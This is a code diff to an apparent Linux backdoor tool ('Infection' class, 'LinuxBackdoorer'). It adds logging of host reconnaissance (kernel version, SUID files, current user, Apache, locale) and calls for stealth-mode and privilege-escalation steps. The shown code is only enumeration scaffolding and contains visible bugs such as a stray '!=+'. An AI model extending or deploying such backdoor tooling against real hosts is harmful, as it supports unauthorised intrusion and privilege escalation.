@@ -106,6 +106,7 @@ void Infection::runLocalCommand(const char* commandToRun, const char* errorMESSA
 	FILE *command = popen(commandToRun, "r");
 	if(command == NULL){
 		printf(errorMESSAGE);
+		log2File("logs.txt", errorMESSAGE);
 	}
 
 	//Print the command
@@ -114,37 +115,46 @@ void Infection::runLocalCommand(const char* commandToRun, const char* errorMESSA
 			if(buffer != ""){
 				KernelRelease = buffer;
 				printf("%s %s", successMessage, buffer);
+				log2File("logs.txt", successMessage + ' ' + *buffer);
 			}
 		} else if(vOutput == "KernelVersion"){
 			if(buffer != ""){
 				KernelVersion = buffer;
 				printf("%s %s", successMessage, buffer);
+				log2File("logs.txt", successMessage + ' ' + *buffer);
 			}
 		} else if(vOutput == "suidFiles") {
 			if(buffer != ""){
 				printf("\t- %s", buffer);
+				//TODO : Log2File
 			}
 		} else if(vOutput == "whoami"){
-			if(buffer != ""){
+			if(buffer !=+ ""){
 				user = buffer;
 				printf("%s %s", successMessage, buffer);
+				log2File("logs.txt", successMessage + ' ' + *buffer);
 			}
 		}else if(vOutput == "findApache"){
 			if(buffer != ""){
 				printf("[+] Found Package : %s", buffer);
+				log2File("logs.txt", "[+] Found Package : " + *buffer);
 				isApache2Present = true;
 			} else {
 				printf("[-] Apache not found on the system !");
+				log2File("logs.txt", "[-] Apache not found on the system");
 				isApache2Present = false;
 			}
 		} else if(vOutput == "localeLanguage"){
 			localLanguage = buffer;
 			printf("%s %s", successMessage, buffer);
+			log2File("logs.txt", successMessage + ' ' + *buffer);
 		} else if(vOutput == "timezone"){
 			localTimeZone = buffer;
 			printf("%s %s", successMessage, buffer);
+			log2File("logs.txt", successMessage + ' ' + *buffer);
 		} else {
 			printf("%s %s", successMessage, buffer);
+			log2File("logs.txt", successMessage + ' ' + *buffer);
 		}
 	}
 }
@@ -197,19 +207,24 @@ void Infection::GetLinuxVersion(){
 }
 
 bool Infection::startInfection(){
-	//GetLinuxVersion
 	FileInformations passwd;
 	passwd = Infection::GetFileInformations("LinuxBackdoorer");
+	//LOG
 	if(std::experimental::filesystem::exists("logs.txt")){
 		Infection::log2File("logs.txt", *user + " added content to log file.");
 	} else {
 		Infection::log2File("logs.txt", *user + " created log file.");
 	}
-	Infection::write2File("TEST.txt", "I am making tests BOW !");
+	//Writing test
+	//Infection::write2File("TEST.txt", "I am making tests BOW !");
+	//Ask for no stealth mode
+	Infection::askForNoStealthMode();
+	//Ask for privileges
 	Infection::askForPrivilegeEscalation();
+	//GetLinuxVersion
 	printf("[+] Get Linux Version");
 	Infection::GetLinuxVersion();
+	//Enumerate adapters;
 	Networking::enumerateAdapters();
 	return true;
-
 }
